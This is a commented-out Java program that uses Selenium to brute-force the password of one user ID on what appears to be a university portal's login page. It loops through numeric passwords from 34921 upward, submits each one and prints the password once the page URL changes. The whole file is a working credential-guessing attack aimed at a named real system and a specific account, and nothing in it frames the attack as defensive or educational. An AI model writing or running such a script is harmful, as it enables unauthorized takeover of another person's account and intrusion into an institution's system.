//package org.example;
//
//import org.openqa.selenium.By;
//import org.openqa.selenium.WebDriver;
//import org.openqa.selenium.WebElement;
//import org.openqa.selenium.chrome.ChromeDriver;
//import org.openqa.selenium.chrome.ChromeOptions;
//
//public class Main {
//    public static void main(String[] args) {
//        String target = "http://slate.nu.edu.pk/portal/relogin";
//        String userId = "f223432";
//        String password = "null";
//
//        ChromeOptions options = new ChromeOptions();
//        options.addArguments("--headless");
//        WebDriver driver = new ChromeDriver();
//
//        driver.get(target);
//
//        WebElement eid = driver.findElement(By.id("eid"));
//        eid.sendKeys(userId);
//
//        String initialUrl = driver.getCurrentUrl();
//
//        for (int i = 34921; ; i++) {
//            try {
//                WebElement pw = driver.findElement(By.id("pw"));
//                WebElement submit = driver.findElement(By.id("submit"));
//
//                pw.clear();
//                pw.sendKeys(String.valueOf(i));
//
//                password = String.valueOf(i);
//                submit.click();
//
//                Thread.sleep(1000);
//
//                if (!driver.getCurrentUrl().equals(initialUrl)) {
//                    System.out.println("Password is: " + password);
//                    break;
//                }
//
//            } catch (Exception e) {
//                System.out.println("Exception encountered: " + e.getMessage());
//            }
//        }
//        driver.quit();
//    }
//}
